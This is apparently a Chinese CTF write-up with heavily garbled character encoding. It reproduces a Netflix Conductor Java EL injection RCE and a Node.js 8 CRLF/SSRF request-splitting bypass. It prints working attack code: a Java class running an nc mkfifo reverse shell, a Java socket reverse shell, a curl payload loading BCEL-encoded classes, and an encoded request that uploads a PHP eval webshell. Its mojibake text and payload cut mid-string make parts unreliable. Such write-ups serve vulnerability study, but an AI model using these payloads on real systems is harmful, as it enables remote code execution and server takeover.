é€šè¿‡ POST è¯·æ±‚è®¿é—® URL /api/metadata/taskdefs åˆ›å»º TaskDef å¯¹è±¡ æ ¹æ®å®˜æ–¹APIç»™å‡ºçš„demoç¨å¾®ä¿®æ”¹åï¼Œå‚æ•°ä¸­çš„ timeoutSeconds å’Œ responseTimeoutSeconds æ»¡è¶³äº† taskDef.getTimeoutSeconds() &gt; 0 ä»¥åŠ taskDef.getResponseTimeoutSeconds() &gt; taskDef.getTimeoutSeconds() è¿™ä¸¤ä¸ªæ¡ä»¶ï¼ŒTaskTimeoutValidator æ ¡éªŒå¤±è´¥ï¼ŒTaskDef çš„ name å±æ€§ä½œä¸ºé”™è¯¯ä¿¡æ¯çš„ä¸€éƒ¨åˆ†é€šè¿‡ buildConstraintViolationWithTemplate(0) è¾“å‡º ç”±äº name æ˜¯æˆ‘ä»¬æ„é€ å¥½çš„ Java EL è¡¨è¾¾å¼ï¼Œæ‰€ä»¥æœ€åè¯¥è¡¨è¾¾å¼ä¼šè¢«æ‰§è¡Œï¼Œè¿›è€ŒæˆåŠŸè§¦å‘è¿œç¨‹ä»£ç æ‰§è¡Œ æ¼æ´åˆ©ç”¨è¿˜è‡ªå¸¦ docker-compose.yaml ä¹Ÿå¤ªè´´å¿ƒäº†å§ ï¼ˆ ç”±äºåˆšåˆšä¸‹è½½çš„å°±æ˜¯2.25.0ç‰ˆæœ¬ï¼Œæ‰€ä»¥ç›´æ¥åˆ‡åˆ° docker ç›®å½•ï¼Œåœ¨ up ä¸€ä¸‹å°±å¥½ 12cd dockerdocker-compose up -d å¦‚æœæœŸé—´æœ‰ä¸‹è½½é”™è¯¯å•¥çš„ï¼Œå¯ä»¥å°è¯•ä»£ç†æˆ–è€… up å¤šå‡ ä¸‹ã€‚ æ³¨æ„äº‹é¡¹æ— è®ºä¸‹é¢æ˜¯è‡ªå·±å†™ BCEL è¿˜æ˜¯ ç›´æ¥ç”¨ç°æœ‰çš„å·¥å…·ï¼Œéƒ½è¦æ³¨æ„ Javaçš„ç‰ˆæœ¬ï¼Œæˆ‘æœ¬åœ°ç”¨çš„æ˜¯ 1.8.0_144 ç‰ˆæœ¬ã€‚ è¿™é‡Œè¿˜ç¯‡æœ‰è¶£çš„æ–‡ç« ï¼ŒBCEL ClassLoaderå»å“ªäº† ï¼Œæˆ‘æ„Ÿè§‰å’Œè¿™ä¸ªæœ‰å…³ï¼Œ2333 æ®ç½‘ä¸Šçœ‹ï¼Œå¥½åƒä¿è¯ Java ç‰ˆæœ¬ &lt; Java 8u261 å³å¯ã€‚ è‡ªå·±å†™ä¸€ä¸ªï¼Œç†Ÿæ‚‰ä¸€ä¸‹BCELä¾èµ–ä¸‹è½½åœ°å€ï¼š https://jar-download.com/artifacts/org.apache.servicemix.bundles/org.apache.servicemix.bundles.jaxp-ri/1.4.5_1/ Main.java 123456789101112import com.sun.org.apache.bcel.internal.Repository;import com.sun.org.apache.bcel.internal.classfile.Utility;import com.sun.org.apache.bcel.internal.classfile.JavaClass;public class Main &#123; public static void main(String[] args) throws Exception &#123; JavaClass cls = Repository.lookupClass(Exp.class); String code = Utility.encode(cls.getBytes(), true); System.out.println(&quot;$$BCEL$$&quot; + code); &#125;&#125; Exp.java 12345678910public class Exp &#123; public static void main(String[] args) &#123; &#125; public Exp() throws Exception&#123; Runtime.getRuntime().exec(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;ç›‘å¬IP&gt; &lt;ç›‘å¬ç«¯å£&gt; &gt;/tmp/f&quot;); &#125;&#125; è¿™ä¸ªPOCæˆ‘åœ¨æœ¬æœºå¯ä»¥æ‰“æˆåŠŸï¼Œä½†æ˜¯é€šè¿‡ curl æ‰“å®é™…dockerç¯å¢ƒ shell å°±åå¼¹ä¸å›æ¥ï¼Œç„¶åä¹Ÿè¯•äº†å„ç§æ–¹æ³• sh åå¼¹æ–¹æ³•ï¼Œæ¯•ç«Ÿæ˜¯ dockeræœ€ç®€ç¯å¢ƒå˜›ï¼Œä¸€èˆ¬é‡Œé¢é™¤äº† sh èƒ½ç”¨å…¶ä»–åŸºæœ¬æ²¡å•¥äº†ã€‚ ç„¶åçªç„¶æƒ³èµ·ä¹‹å‰çœ‹åˆ°è¿™ç¯‡é…’ä»™æ¡¥çš„æ–‡ç« ï¼Œä»–é‡åˆ°çš„æƒ…å½¢å’Œæˆ‘ä¸€æ ·ã€‚ç„¶åé€šè¿‡ java ç¼–å†™ socket çš„æ€è·¯æ¥åå¼¹shellï¼Œè¿™æ ·å¯ä»¥ä¸ä¾èµ–äºå…·ä½“çš„ç³»ç»Ÿç¯å¢ƒã€‚ çœŸ Exp.java 12345678910111213141516171819202122232425262728293031323334import java.net.Socket;import java.io.InputStream;import java.io.OutputStream;public class Exp &#123; public Exp() throws Exception &#123; String host=&quot;&quot;; // // ncç›‘å¬IP int port=; // ncç›‘å¬ç«¯å£ï¼Œæ³¨æ„æ˜¯æ•´å‹ä¸æ˜¯å­—ç¬¦ä¸² String cmd=&quot;/bin/sh&quot;; // å¦‚æœæ˜¯ windows å°±æ¢æˆ cmd.exe Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); Socket s=new Socket(host,port); InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed())&#123; while(pi.available()&gt;0) so.write(pi.read()); while(pe.available()&gt;0) so.write(pe.read()); while(si.available()&gt;0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try &#123; p.exitValue(); break; &#125;catch (Exception e)&#123; &#125; &#125;; p.destroy(); s.close(); &#125;&#125; å½“ç„¶å¯ä»¥ä¸åå¼¹shellï¼Œå¯ä»¥é€šè¿‡ wget ä¹‹ç±»çš„æ–¹å¼ä¸‹è½½åˆ°æœ¬åœ°åœ¨åŠ è½½ï¼Œ ä¸è¿‡å°±æ˜¯æƒ³å¤ç°ä¸€ä¸‹ï¼Œä¸‡ä¸€ä»¥åé‡åˆ°äº† HTTP ä¸å‡ºç½‘å‘¢ ï¼ˆ ç»“æ„å¦‚ä¸‹ BCELç¼–ç åçš„æ¶æ„ä»£ç  ç›´æ¥ç”¨ç°æœ‰å·¥å…·https://github.com/f1tz/BCELCodeman ä¹Ÿæ˜¯å…ˆå†™å¥½ expï¼Œç„¶å 1javac Exp.java -d /tmp/Exp.class BCELç¼–ç åçš„æ¶æ„ä»£ç  1java -jar BCELCodeman.jar e /tmp/Exp.class æ„é€ POCå¾—åˆ°ç¼–ç åæ„é€  POC ï¼Œä¸»è¦æ˜¯æ›¿æ¢ name éƒ¨åˆ†ä¸º ELè¡¨è¾¾å¼ï¼Œå†…å®¹ä¸º com.sun.org.apache.bcel.internal.util.ClassLoader åŠ è½½å™¨åŠ è½½BCELç¼–ç åçš„æ¶æ„ä»£ç  12345678910111213141516curl -X POST \\ http://localhost:8080/api/metadata/taskdefs \\ -H &#x27;Content-Type: application/json&#x27; \\ -d &#x27;[ &#123; &quot;name&quot;: &quot;$&#123;&#x27;\\&#x27;&#x27; &#x27;\\&#x27;&#x27;.getClass().forName(&#x27;\\&#x27;&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;\\&#x27;&#x27;).newInstance().loadClass(&#x27;\\&#x27;&#x27;&lt;åˆšåˆšç”Ÿæˆçš„BCELç¼–ç &gt;&#x27;\\&#x27;&#x27;).newInstance().class&#125;&quot;, &quot;ownerEmail&quot;: &quot;test@example.org&quot;, &quot;retryCount&quot;: 3, &quot;retryLogic&quot;: &quot;FIXED&quot;, &quot;retryDelaySeconds&quot;: 10, &quot;timeoutSeconds&quot;: 180, &quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;, &quot;responseTimeoutSeconds&quot;: 300, &quot;ownerEmail&quot;: &quot;type your email here&quot; &#125;]&#x27; æˆåŠŸåå¼¹shell æ ¹æ®æ¼æ´ç›¸å…³çš„ pull requestsï¼šhttps://github.com/Netflix/conductor/pull/1543 å¯ä»¥å®šä½å¯¹è¯¥æ¼æ´çš„ä¿®å¤ å¼€å‘è€…å°† org.hibernate:hibernate-validator æ›¿æ¢ä¸ºäº† org.apache.bval:bval-jsrï¼Œè€Œåè€…åœ¨æœ€æ–°ç‰ˆæœ¬ä¸‹ä¸ä¼šè§£æ Java EL è¡¨è¾¾å¼ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šæœ‰ RCE çš„å±é™©ã€‚ å¥½ï¼Œæœ¬åœ°å¤ç°æˆåŠŸï¼ŒæŠŠè¿™ä¸ª POC ç›´æ¥æ‰“çº¿ä¸Šï¼Œä¼°è®¡é—®é¢˜ä¸å¤§ å›åˆ°é¢˜ç›®ä¸­ç°åœ¨æ¼æ´æ˜¯å¯ä»¥å°è¯•å»åˆ©ç”¨äº†ï¼Œé—®é¢˜æ˜¯ï¼Œé¢˜ç›®åªæä¾› GET çš„ä»£ç†ï¼Œæ— æ³•å‘é€ POST è¯·æ±‚ã€‚ ç»§ç»­æ²¿ç€ä¸€å¼€å§‹çš„æ€è·¯èµ°ï¼ŒCRLF SSRF guguruäº†ä¸€ä¸‹ï¼Œnodejs CRLF æ¼æ´ï¼Œå‘ç°è¿˜çœŸæœ‰2333 è¿™ç¯‡å†™çš„æ¯”è¾ƒè¯¦ç»†ï¼Œè·Ÿç€å¤ç°ä¸€ä¸‹ https://mp.weixin.qq.com/s/X6dq1WsKcEjNVwSJKiBMvA ç„¶åçœ‹äº†åˆ«äººçš„å¤ç°ï¼Œå‘ç°æœ‰ä¸€ä¸ªæ¯”è¾ƒéšç§˜çš„æç¤ºã€‚ã€‚ 1const salt = &#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27; ä¸­é—´è—äº†ä¸ª 8ï¼Œï¼Œ nodejs8 is bestï¼Œ2333 ä¸è¿‡ä¸ä¼¤å¤§é›…ï¼Œçœ¼ç›ä¸å¥½ç½‘ä¸Šæœä¸€ä¸‹ä¹Ÿå¯ä»¥çŸ¥é“ nodejs HTTPåº“åŒ…å«äº†é˜»æ­¢CRLFçš„æªæ–½ï¼Œæ™®é€š CRLFä¸ç®¡ç”¨ï¼Œä½†å¯ä»¥é€šè¿‡ nodejs çš„è®¾è®¡ä¸ä¸¥è°¨é—®é¢˜æ¥ç»•è¿‡ã€‚å½“ç„¶è¿™ä¸ªé—®é¢˜åœ¨ nodejs10 è¢«ä¿®å¤äº†ï¼Œå¦‚æœè¯·æ±‚è·¯å¾„åŒ…å«éAsciiå­—ç¬¦ï¼Œåˆ™ä¼šæŠ›å‡ºé”™è¯¯ã€‚ nodejs &lt; 9ç‰ˆæœ¬ CRLFæ³¨å…¥å¯¹äº Node.js v8 æˆ–æ›´ä½ç‰ˆæœ¬ï¼Œå¦‚æœæœ‰ä¸‹åˆ—æƒ…å†µï¼Œä»»ä½•å‘å‡ºHTTPè¯·æ±‚çš„æœåŠ¡å™¨éƒ½å¯èƒ½å—åˆ°é€šè¿‡è¯·æ±‚æ‹†å®ç°çš„SSRFçš„æ”»å‡»ï¼š æ¥å—æ¥è‡ªç”¨æˆ·è¾“å…¥çš„Unicodeæ•°æ® å¹¶å°†å…¶åŒ…å«åœ¨HTTPè¯·æ±‚çš„è·¯å¾„ä¸­ ä¸”è¯·æ±‚å…·æœ‰ä¸€ä¸ª0é•¿åº¦çš„ä¸»ä½“ï¼ˆæ¯”å¦‚ä¸€ä¸ª GET æˆ–è€… DELETEï¼‰ ç”±äºæœ¬æœºæ˜¯ node10+ï¼Œæ‰€ä»¥dockeræ‹‰ä¸ªé•œåƒï¼Œ 1docker pull node:8.8.0-alpine è¿›å…¥å®¹å™¨çš„nodeç¯å¢ƒï¼Œç„¶åè¯•è¯•æ™®é€šçš„ CRLF 1234/ # node&gt; var http = require(&quot;http&quot;);&gt; http.get(&#x27;http://192.168.123.37:2233/\\r\\nwhoami&#x27;).output[ &#x27;GET /%0D%0Awhoami HTTP/1.1\\r\\nHost: 192.168.123.37:2233\\r\\nConnection: close\\r\\n\\r\\n&#x27; ] è¿”å›åŒ… 1234&gt; nc -lv 0.0.0.0 2233GET /%0D%0Awhoami HTTP/1.1Host: 192.168.123.37:2233Connection: close nodejs Unicode å­—ç¬¦æŸå¤±åŸç† å½“ Node.js v8 æˆ–æ›´ä½ç‰ˆæœ¬å¯¹URLå‘å‡ºçš„ GET è¯·æ±‚è¿›è¡Œå¤„ç†æ—¶ï¼Œå®ƒä¸ä¼šè¿›è¡Œç¼–ç è½¬ä¹‰ï¼Œå› ä¸ºå®ƒä»¬ä¸æ˜¯HTTPæ§åˆ¶å­—ç¬¦ï¼Œä½†HTTPè¯·æ±‚è¿”å›çš„ç»“æœä¸­ä¼šè¢«ç¼–ç ä¸º latin1 ç¼–ç å†™å…¥è·¯å¾„ï¼Œä½† latin1 ç¼–ç ä¸ºå•å­—èŠ‚ç¼–ç ï¼ˆç¼–ç èŒƒå›´ä¸º 0x00 - 0xFF ï¼Œå…¶ä¸­ 0x00 - 0x7Fä¹‹é—´å®Œå…¨å’ŒASCIIä¸€è‡´ï¼Œ0x80 - 0x9Fä¹‹é—´æ˜¯æ§åˆ¶å­—ç¬¦ï¼Œ0xA0 - 0xFFä¹‹é—´æ˜¯æ–‡å­—ç¬¦å· ï¼‰ï¼Œå¦‚æœæ­¤æ—¶æˆ‘ä»¬ç”¨å•å­—èŠ‚ 8ä½ Unicode ç¼–ç ï¼Œé‚£ä¹ˆé«˜ 4 ä½ä¼šè¢«æˆªæ–­ã€‚ æ„é€ è¯·æ±‚ 12&gt; http.get(&#x27;http://192.168.123.37:2233/\\u&#123;220D&#125;\\u&#123;330A&#125;tari&#x27;).output[ &#x27;GET /âˆãŒŠtari HTTP/1.1\\r\\nHost: 192.168.123.37:2233\\r\\nConnection: close\\r\\n\\r\\n&#x27; ] è¿”å›åŒ… 12345&gt; nc -lv 0.0.0.0 2233GET /tari HTTP/1.1Host: 192.168.123.37:2233Connection: close è§‚å¯Ÿ \\u&#123;220D&#125; å’Œ \\u&#123;330A&#125; ï¼Œå…¶ä¸­ 22 å’Œ 33 éšæ„ï¼Œä»€ä¹ˆéƒ½è¡Œï¼Œå› ä¸ºæœ€ç»ˆé«˜ 4 ä½éƒ½ä¼šè¢«æˆªæ–­ï¼Œç„¶å 0D å’Œ 0A åˆ†åˆ«ä¸º \\r å’Œ \\n çš„ ASCIIç ï¼Œç„¶åLatin1æ˜¯å‘ä¸‹å…¼å®¹ASCIIç çš„ï¼Œæ‰€ä»¥è¿”å›åŒ…è¢« \\r\\n æˆªæ–­äº†ï¼Œ tari å˜åœ¨ç¬¬äºŒè¡Œ å¯è§ï¼Œå¯ä»¥é€šè¿‡æ„é€  Unicodeå­—ç¬¦ï¼Œåœ¨ nodejs å®ç° CRLFæ³¨å…¥ã€‚ åœ¨å®é™…ä½¿ç”¨æ—¶ï¼Œå› ä¸º CRLF + SSRF ç‚¹ åœ¨ HTTP çŠ¶æ€è¡Œï¼Œæ‰€ä»¥è¦æ³¨æ„é—­åˆåŸæœ‰çš„çŠ¶æ€è¡Œä¸­çš„ HTTP/1.1ï¼Œå³ä¿è¯æ³¨å…¥åæœ‰æ­£å¸¸çš„ HTTP çŠ¶æ€è¡Œï¼Œ å…ˆä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾ç›®æ ‡ä¸»æœºå­˜åœ¨SSRFï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç›®æ ‡ä¸»æœºæœ¬åœ°ä¸Šä¼ æ–‡ä»¶ã€‚æˆ‘ä»¬éœ€è¦å°è¯•æ„é€ å¦‚ä¸‹è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ çš„å®Œæ•´ POST è¯·æ±‚ï¼š 12345678910111213141516171819202122232425POST /upload.php HTTP/1.1Host: 127.0.0.1Content-Length: 437Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4Connection: close------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;100000------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;Content-Type: application/octet-stream&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;Upload&quot;Upload------WebKitFormBoundaryjDb9HMGTixAA7Am6-- ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªPOSTè¯·æ±‚é‡Œé¢çš„æ‰€æœ‰çš„å­—ç¬¦åŒ…æ‹¬æ§åˆ¶ç¬¦å…¨éƒ¨ç”¨ä¸Šè¿°çš„é«˜ç¼–å·Unicodeç è¡¨ç¤ºï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041payload = &#x27;&#x27;&#x27; HTTP/1.1POST /upload.php HTTP/1.1Host: 127.0.0.1Content-Length: 437Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4Connection: close------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;100000------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;Content-Type: application/octet-stream&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;Upload&quot;Upload------WebKitFormBoundaryjDb9HMGTixAA7Am6--GET / HTTP/1.1test:&#x27;&#x27;&#x27;.replace(&quot;\\n&quot;,&quot;\\r\\n&quot;)def payload_encode(raw): ret = u&quot;&quot; for i in raw: ret += chr(0x0100+ord(i)) return retpayload = payload_encode(payload)print(payload)# è¾“å‡º: Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÄÄŠÅÅÅ“Å”Ä Ä¯ÅµÅ°Å¬Å¯Å¡Å¤Ä®Å°Å¨Å°Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅˆÅ¯Å³Å´ÄºÄ Ä±Ä²Ä·Ä®Ä°Ä®Ä°Ä®Ä±ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­ÅŒÅ¥Å®Å§Å´Å¨ÄºÄ Ä´Ä³Ä·ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å­ÅµÅ¬Å´Å©Å°Å¡Å²Å´Ä¯Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å¢Å¯ÅµÅ®Å¤Å¡Å²Å¹Ä½Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅ•Å³Å¥Å²Ä­ÅÅ§Å¥Å®Å´ÄºÄ ÅÅ¯ÅºÅ©Å¬Å¬Å¡Ä¯ÄµÄ®Ä°Ä Ä¨Å—Å©Å®Å¤Å¯Å·Å³Ä ÅÅ”Ä Ä±Ä°Ä®Ä°Ä»Ä Å—Å©Å®Ä¶Ä´Ä»Ä Å¸Ä¶Ä´Ä©Ä ÅÅ°Å°Å¬Å¥Å—Å¥Å¢Å‹Å©Å´Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶Ä Ä¨Å‹ÅˆÅ”ÅÅŒÄ¬Ä Å¬Å©Å«Å¥Ä Å‡Å¥Å£Å«Å¯Ä©Ä ÅƒÅ¨Å²Å¯Å­Å¥Ä¯Ä¹Ä°Ä®Ä°Ä®Ä´Ä´Ä³Ä°Ä®Ä·Ä²Ä Å“Å¡Å¦Å¡Å²Å©Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶ÄÄŠÅÅ£Å£Å¥Å°Å´ÄºÄ Å´Å¥Å¸Å´Ä¯Å¨Å´Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å¨Å´Å­Å¬Ä«Å¸Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å­Å¬Ä»Å±Ä½Ä°Ä®Ä¹Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å¶Å©Å¦Ä¬Å©Å­Å¡Å§Å¥Ä¯Å·Å¥Å¢Å°Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å°Å®Å§Ä¬ÄªÄ¯ÄªÄ»Å±Ä½Ä°Ä®Ä¸Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å³Å©Å§Å®Å¥Å¤Ä­Å¥Å¸Å£Å¨Å¡Å®Å§Å¥Ä»Å¶Ä½Å¢Ä³Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­Å…Å®Å£Å¯Å¤Å©Å®Å§ÄºÄ Å§ÅºÅ©Å°Ä¬Ä Å¤Å¥Å¦Å¬Å¡Å´Å¥ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­ÅŒÅ¡Å®Å§ÅµÅ¡Å§Å¥ÄºÄ ÅºÅ¨Ä­ÅƒÅÄ¬ÅºÅ¨Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅƒÅ¯Å¯Å«Å©Å¥ÄºÄ ÅÅˆÅÅ“Å…Å“Å“Å‰Å„Ä½Å®Å«Ä¶Ä·Å¡Å³Å´Å¶Ä¶Ä±Å¨Å±Å¡Å®Å³Å«Å«Å¤Å¤Å³Å¬Å«Å§Å³Å´Ä´ÄÄŠÅƒÅ¯Å®Å®Å¥Å£Å´Å©Å¯Å®ÄºÄ Å£Å¬Å¯Å³Å¥ÄÄŠÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅÅÅ˜ÅŸÅ†Å‰ÅŒÅ…ÅŸÅ“Å‰ÅšÅ…Ä¢ÄÄŠÄÄŠÄ±Ä°Ä°Ä°Ä°Ä°ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅµÅ°Å¬Å¯Å¡Å¤Å¥Å¤Ä¢Ä»Ä Å¦Å©Å¬Å¥Å®Å¡Å­Å¥Ä½Ä¢Å³Å¨Å¥Å¬Å¬Ä®Å°Å¨Å°Ä¢ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¯Å£Å´Å¥Å´Ä­Å³Å´Å²Å¥Å¡Å­ÄÄŠÄÄŠÄ¼Ä¿Å°Å¨Å°Ä Å¥Å¶Å¡Å¬Ä¨Ä¤ÅŸÅÅÅ“Å”Å›Ä¢Å·Å¨Å¯Å¡Å­Å©Ä¢ÅÄ©Ä»Ä¿Ä¾ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢Å•Å°Å¬Å¯Å¡Å¤Ä¢ÄÄŠÄÄŠÅ•Å°Å¬Å¯Å¡Å¤ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶Ä­Ä­ÄÄŠÄÄŠÅ‡Å…Å”Ä Ä¯Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅ´Å¥Å³Å´Äº æ„é€ è¯·æ±‚ï¼š 12&gt; http.get(&#x27;http://192.168.123.37:2233/Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÄÄŠÅÅÅ“Å”Ä Ä¯ÅµÅ°Å¬Å¯Å¡Å¤Ä®Å°Å¨Å°Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅˆÅ¯Å³Å´ÄºÄ Ä±Ä²Ä·Ä®Ä°Ä®Ä°Ä®Ä±ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­ÅŒÅ¥Å®Å§Å´Å¨ÄºÄ Ä´Ä³Ä·ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å­ÅµÅ¬Å´Å©Å°Å¡Å²Å´Ä¯Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å¢Å¯ÅµÅ®Å¤Å¡Å²Å¹Ä½Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅ•Å³Å¥Å²Ä­ÅÅ§Å¥Å®Å´ÄºÄ ÅÅ¯ÅºÅ©Å¬Å¬Å¡Ä¯ÄµÄ®Ä°Ä Ä¨Å—Å©Å®Å¤Å¯Å·Å³Ä ÅÅ”Ä Ä±Ä°Ä®Ä°Ä»Ä Å—Å©Å®Ä¶Ä´Ä»Ä Å¸Ä¶Ä´Ä©Ä ÅÅ°Å°Å¬Å¥Å—Å¥Å¢Å‹Å©Å´Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶Ä Ä¨Å‹ÅˆÅ”ÅÅŒÄ¬Ä Å¬Å©Å«Å¥Ä Å‡Å¥Å£Å«Å¯Ä©Ä ÅƒÅ¨Å²Å¯Å­Å¥Ä¯Ä¹Ä°Ä®Ä°Ä®Ä´Ä´Ä³Ä°Ä®Ä·Ä²Ä Å“Å¡Å¦Å¡Å²Å©Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶ÄÄŠÅÅ£Å£Å¥Å°Å´ÄºÄ Å´Å¥Å¸Å´Ä¯Å¨Å´Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å¨Å´Å­Å¬Ä«Å¸Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å­Å¬Ä»Å±Ä½Ä°Ä®Ä¹Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å¶Å©Å¦Ä¬Å©Å­Å¡Å§Å¥Ä¯Å·Å¥Å¢Å°Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å°Å®Å§Ä¬ÄªÄ¯ÄªÄ»Å±Ä½Ä°Ä®Ä¸Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å³Å©Å§Å®Å¥Å¤Ä­Å¥Å¸Å£Å¨Å¡Å®Å§Å¥Ä»Å¶Ä½Å¢Ä³Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­Å…Å®Å£Å¯Å¤Å©Å®Å§ÄºÄ Å§ÅºÅ©Å°Ä¬Ä 